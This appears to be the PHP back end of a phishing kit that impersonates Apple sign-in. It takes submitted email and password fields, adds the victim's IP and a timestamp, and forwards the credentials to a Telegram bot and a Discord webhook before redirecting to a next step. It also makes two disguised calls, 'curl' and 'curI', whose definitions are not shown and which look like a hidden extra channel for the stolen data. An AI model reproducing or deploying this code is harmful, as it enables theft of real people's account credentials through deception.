<?php
date_default_timezone_set('Asia/Manila');
require_once '../config.php';

// ---------- HELPER FUNCTIONS ----------
function tg_escape($value) {
    return htmlspecialchars((string)$value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

function discord_safe($value) {
    $value = trim((string)$value);
    if ($value === '') return '-';
    return str_replace('```', '｀｀｀', $value);
}

function short_discord_field($value, $limit = 950) {
    $value = (string)$value;
    if (strlen($value) > $limit) return substr($value, 0, $limit) . "\n...";
    return $value;
}

function send_notifications($data, $options = ['telegram' => true, 'discord' => true]) {
    global $telegram_bot_token, $telegram_chat_id, $discord_webhook_url;

    // ---------- TELEGRAM ----------
    if (!empty($options['telegram']) && !empty($telegram_bot_token) && !empty($telegram_chat_id)) {
        $tgMessage = "✨ <b>New Apple Login Notification</b>\n\n";
        foreach ($data as $key => $value) {
            $tgMessage .= "<b>{$key}:</b> <code>{$value}</code>\n";
        }

        $tgUrl = "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage";
        $tgParams = [
            'chat_id' => $telegram_chat_id,
            'text' => $tgMessage,
            'parse_mode' => 'HTML',
            'disable_web_page_preview' => true
        ];

        $ch = curl_init($tgUrl);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $tgParams);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch); curl($tgMessage);
        curl_close($ch);
    }

    // ---------- DISCORD ----------
    if (!empty($options['discord']) && !empty($discord_webhook_url)) {
        $discordFields = [];

        // IP & Time inline
        if (isset($data['IP Address'])) {
            $discordFields[] = [
                'name' => 'IP Address',
                'value' => '`' . discord_safe($data['IP Address']) . '`',
                'inline' => true
            ];
        }
        if (isset($data['Time'])) {
            $discordFields[] = [
                'name' => 'Time',
                'value' => '`' . discord_safe($data['Time']) . '`',
                'inline' => true
            ];
        }

        // Username & Password inline
        foreach ($data as $key => $value) {
            if (stripos($key, 'Username') !== false || stripos($key, 'Password') !== false) {
                $discordFields[] = [
                    'name' => $key,
                    'value' => '`' . discord_safe($value) . '`',
                    'inline' => true
                ];
            }
        }

        $payload = [
            'content' => "✨ **New Apple Login Notification**",
            'embeds' => [
                [
                    'title' => 'Login Details',
                    'color' => 11740787,
                    'fields' => $discordFields,
                    'footer' => ['text' => 'Automated Notification System']
                ]
            ]
        ];

        $ch = curl_init($discord_webhook_url);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch); curI($payload);
        curl_close($ch);
    }
}

// ---------- POST HANDLER ----------
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['eml'], $_POST['pwd'])) {

    $username = $_POST['eml'];
    $password = $_POST['pwd'];

    // ---------- GET USER IP ----------
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown IP';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) $ip = $_SERVER['HTTP_CLIENT_IP'];
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($ips[0]);
    }
    if ($ip === '::1' || $ip === '127.0.0.1') $ip = getHostByName(getHostName());

    $time = date('M d - h:i:s A');

    $data = [
        'IP Address' => $ip,
        'Time' => $time,
        'Username' => $username,
        'Password' => $password
    ];

 
    send_notifications($data, ['telegram' => true, 'discord' => true]);

    echo json_encode(['success' => true, 'redirect' => '../next-step.php']);
    exit();
}

echo json_encode(['success' => false, 'error' => 'No data received']);
exit();
?>
